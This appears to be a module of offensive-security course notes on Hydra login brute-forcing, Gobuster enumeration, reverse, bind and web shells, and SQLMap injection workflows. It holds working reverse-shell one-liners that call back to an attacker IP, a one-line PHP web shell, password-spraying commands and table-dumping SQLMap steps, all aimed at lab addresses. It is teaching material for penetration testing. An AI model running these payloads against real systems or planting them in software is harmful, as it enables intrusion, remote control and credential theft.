# Module 09: Offensive Security Tooling

> **Overview:** This module covers four essential tools and techniques used in every offensive engagement: online credential brute-forcing (`Hydra`), web directory/subdomain enumeration (`Gobuster`), establishing remote command execution (`Reverse/Bind/Web Shells`), and automated SQL Injection exploitation (`SQLMap`).

---

## Chapter 1: Hydra

### Core Concepts
- **THC-Hydra (`hydra`):** A fast, parallelized **online** login brute-forcing tool supporting over 50 protocols (`ssh`, `ftp`, `rdp`, `smb`, `mysql`, `http-post-form`, `http-get`, `vnc`).
- **Online vs. Offline Cracking:**
  - *Offline (`John` / `Hashcat`):* Cracks captured password hashes locally using your own CPU/GPU (thousands/millions of guesses per second).
  - *Online (`Hydra`):* Sends actual login requests over the network to a live service (slower; generates network logs and risks triggering account lockouts or fail2ban).

### Essential Hydra Syntax & Flags
| Flag | Description |
| :--- | :--- |
| `-l <user>` | Single known username (`-l admin`) |
| `-L <users.txt>` | Wordlist of usernames |
| `-p <pass>` | Single known password (useful for **Password Spraying** with `-L users.txt -p Spring2026!`) |
| `-P <pass.txt>` | Wordlist of passwords (`/usr/share/wordlists/rockyou.txt`) |
| `-s <port>` | Specify a non-default port number |
| `-t <tasks>` | Number of parallel connections/threads (default `16`; lower to `4` for SSH if unstable) |
| `-vV` | Verbose mode — shows every `username:password` attempt in real time |
| `-f` | Stop immediately after finding the first valid login pair |

### Common Hydra Protocol Examples
```bash
# 1. Brute-forcing SSH (Port 22)
hydra -l mark -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10 -t 4 -vV

# 2. Brute-forcing FTP (Port 21)
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10

# 3. Brute-forcing RDP (Port 3389)
hydra -L users.txt -p "Password123" rdp://10.10.10.10

# 4. Brute-forcing an HTTP POST Login Form
# Syntax: "<PATH>:<POST_BODY_WITH_^USER^_AND_^PASS^>:<FAILURE_STRING>"
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

---

## Chapter 2: Gobuster: The Basics

### Core Concepts
- **Gobuster:** A high-speed brute-forcing tool written in Go used to discover hidden web directories/files, DNS subdomains, and virtual hosts.

### Gobuster Modes & Essential Flags
1. **`dir` Mode (Directory & File Enumeration):**
   Discovers unlinked directories (`/admin`, `/backup`) and files (`config.php.bak`, `notes.txt`).
   ```bash
   gobuster dir -u http://10.10.10.10/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,html -t 50
   ```
   - `-u`: Target URL.
   - `-w`: Path to wordlist (commonly `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`).
   - `-x`: File extensions to append to each word (`php,txt,js,bak`).
   - `-t`: Number of concurrent threads (default `10`).
   - `-k`: Skip SSL/TLS certificate verification on self-signed HTTPS targets.
   - `-b`: Blacklist/ignore specific HTTP status codes (e.g., `-b 404,403`).

2. **`dns` Mode (Subdomain Enumeration):**
   Queries DNS servers to find active subdomains (`dev.example.thm`, `mail.example.thm`):
   ```bash
   gobuster dns -d example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
   ```
   *(Note: In newer Gobuster versions, use `-do` instead of `-d`).*

3. **`vhost` Mode (Virtual Host Enumeration):**
   Fuzzes the HTTP `Host:` header to find virtual hosts hosted on the same IP address:
   ```bash
   gobuster vhost -u http://10.10.10.10 -w subdomains.txt --append-domain
   ```

---

## Chapter 3: Shells Overview

### Types of Shells
1. **Reverse Shell (Most Common):**
   - **Attacker** listens on a local port (`nc -lvnp 4444`); **Target** initiates an outbound connection back to the attacker and redirects its shell `stdin`/`stdout`/`stderr` over the socket.
   - **Why prefer Reverse Shells?** Firewalls almost always block unexpected *inbound* connections to the target, but frequently allow *outbound* connections (especially on ports `80`, `443`, `53`).
2. **Bind Shell:**
   - **Target** opens a listening port (`nc -lvnp 4444 -e /bin/bash`); **Attacker** connects directly to the target (`nc <TARGET_IP> 4444`).
3. **Web Shell:**
   - A malicious script (`shell.php`, `cmd.aspx`, `shell.jsp`) uploaded to a web server that executes OS commands via HTTP parameters:
     ```php
     <?php system($_GET['cmd']); ?>
     ```
     Usage: `http://10.10.10.10/uploads/shell.php?cmd=id`

### Common Reverse Shell One-Liners
**1. Attacker Listener (`netcat`):**
```bash
nc -lvnp 4444
# Or using rlwrap for arrow-key history support on Windows shells:
rlwrap nc -lvnp 4444
```

**2. Target Payloads (Reference: [revshells.com](https://www.revshells.com/)):**
```bash
# Bash TCP Reverse Shell
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'

# Netcat (mkfifo named pipe — works when -e flag is disabled)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f

# Python3 Reverse Shell
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

### Stabilizing / Upgrading a Dumb Linux Shell to a Full Interactive TTY
Raw netcat shells lack job control (`Ctrl+C` kills your entire netcat session!), tab completion, and `su`/`sudo` support. Upgrade it in 3 steps:
```bash
# Step 1 (Inside the reverse shell): Spawn a pseudo-terminal using Python
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Step 2: Press Ctrl+Z to background the shell and return to your local Kali terminal

# Step 3 (On your local Kali terminal): Pass raw keystrokes and foreground the shell
stty raw -echo; fg
```

---

## Chapter 4: SQLMap: The Basics

### Core Concepts
- **SQLMap (`sqlmap`):** An open-source penetration testing tool that automates the detection and exploitation of **SQL Injection (SQLi)** flaws and database server takeover.
- **Supported SQLi Types:**
  - `B`: Boolean-based blind
  - `E`: Error-based
  - `U`: Union query-based
  - `S`: Stacked queries
  - `T`: Time-based blind

### Step-by-Step Enumeration Workflow
#### 1. Testing a GET URL (`-u`) or Saved Burp Request (`-r`)
> **Pro Tip:** Saving an intercepted HTTP request from Burp Suite to a text file (`req.txt`) and passing `-r req.txt` to `sqlmap` is the easiest way to handle POST requests, cookies, and custom headers!

```bash
# Step 1: Enumerate database names (--dbs)
sqlmap -u "http://10.10.10.10/blood/view.php?id=1" --dbs --batch

# Step 2: Enumerate tables inside a specific database (-D <db> --tables)
sqlmap -u "http://10.10.10.10/blood/view.php?id=1" -D blood --tables --batch

# Step 3: Enumerate columns inside a specific table (-D <db> -T <table> --columns)
sqlmap -u "http://10.10.10.10/blood/view.php?id=1" -D blood -T users --columns --batch

# Step 4: Dump the data from the table (-D <db> -T <table> --dump)
sqlmap -u "http://10.10.10.10/blood/view.php?id=1" -D blood -T users -C username,password --dump --batch
```

### Important SQLMap Flags
| Flag | Description |
| :--- | :--- |
| `-u <URL>` | Target URL containing a query parameter (`?id=1`) |
| `-r <file>` | Load raw HTTP request exported from Burp Suite |
| `-p <param>` | Explicitly specify which parameter to test (`-p id`) |
| `--batch` | Non-interactive mode; automatically selects default answers for prompts |
| `--current-user` / `--current-db` | Retrieve the current DBMS user and active database name |
| `--level=<1-5>` | Depth of tests to perform (higher levels test Cookies, User-Agent, Referer) |
| `--risk=<1-3>` | Risk of payload types (`3` adds OR-based payloads; be careful on UPDATE/DELETE queries) |
| `--os-shell` | Attempt to spawn an interactive OS command shell if the DB user has file-write privileges |
